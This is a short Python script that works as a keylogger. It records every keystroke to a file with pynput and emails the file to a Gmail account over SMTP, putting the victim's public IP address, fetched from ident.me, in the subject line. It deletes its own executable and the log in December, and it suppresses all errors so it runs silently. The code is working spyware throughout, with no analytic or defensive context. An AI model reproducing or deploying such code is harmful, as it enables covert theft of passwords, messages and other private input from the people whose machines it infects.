from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import urllib.request
import datetime
import os


try:
    now = datetime.datetime.now()

    filename = "this_file"

    log_dir = ""


    if(now.month==12):
        os.remove("this_file.exe")
        os.remove("SaveKeystokes.txt")
    


    #mail stuff
    email = 'mail-to-login'

    subject = str(now.year) +"/"+ str(now.month) +"/"+ str(now.day)


    msg = MIMEMultipart()

    msg['Subject'] = subject + " Date" + urllib.request.urlopen('http://ident.me').read().decode('utf8')

    attachment = open(filename,'r')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content','attachment; filename = ' + filename)

    msg.attach(part)
    text = msg.as_string()


    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,'email-password');



    server.sendmail(email,email,text)
    server.quit()

    attachment = open(filename,'w+')

except:
    pass

try:
    attachment = open(filename,'w+')
    #keylogger
    logging.basicConfig(filename=(log_dir + filename),
                        level=logging.DEBUG, format='%(message)s')

    def on_press(key):
        logging.info(key)


    with Listener(on_press=on_press) as listener:
        listener.join()
except:
    pass
